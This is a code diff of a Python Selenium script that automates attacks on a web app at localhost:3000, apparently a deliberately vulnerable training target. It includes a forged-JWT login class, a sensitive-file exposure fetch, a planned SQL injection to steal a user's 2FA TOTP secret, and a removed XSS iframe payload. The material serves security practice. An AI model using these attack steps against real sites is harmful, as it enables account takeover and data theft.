@@ -5,7 +5,7 @@ from selenium.webdriver.chrome.options import Options
 from abc import ABC, abstractmethod 
 
 
-BASE_URL = "localhost:3000/#"
+BASE_URL = "localhost:3000"
 
 class Attack(ABC):
     """
@@ -89,7 +89,7 @@ class FalseJWTLogin(Attack):
         add cookie to prevent welcome banner
         """
         driver = webdriver.Chrome(options=self.chrome_options)
-        driver.get(self.base_url + "/login")
+        driver.get(self.base_url + "/#/login")
         # get rid of pop up window by clicking in top right corner
         driver.find_element_by_xpath(
                 """//div[contains(@class,"cdk-overlay-pane")]
@@ -152,31 +152,15 @@ class SensitiveDataExposure(Attack):
 
     def run(self, exposed_file_path):
         driver = webdriver.Chrome(options=self.chrome_options)
+        time.sleep(2)
         driver.get(self.base_url + exposed_file_path) 
+        time.sleep(5)
 
 class TwoFactor:
     """
     Steps to attack 2FA:
-    -> SQLInjection to receive totpsecret of 2FA of user wurstbrot
+    -> SQLInjection to receive totpsecret:  of 2FA of user wurstbrot
     """
     def run():
         pass
-        """
-        try:
-            # get rid of pop up window by clicking in top right corner
-            self.driver.find_element_by_xpath(
-                 //div[contains(@class,"cdk-overlay-pane")]
-                 //button[@aria-label="Close Welcome Banner"]
-                ).click()
-        except:
-            print("banner not removed")
-        attack_vector = '<iframe src="javascript:alert(`xss`)">'
-        # klick on search icon to be able to enter search query
-        search_icon = driver.find_element_by_xpath(
-            '//*[@id="searchQuery"]/span/mat-icon[2]')
-        search_icon.click()
-        search_field = driver.find_element_by_xpath(
-            '//*[@id="mat-input-0"]')
-        search_field.send_keys(attack_vector)
-        
-        """ 
+
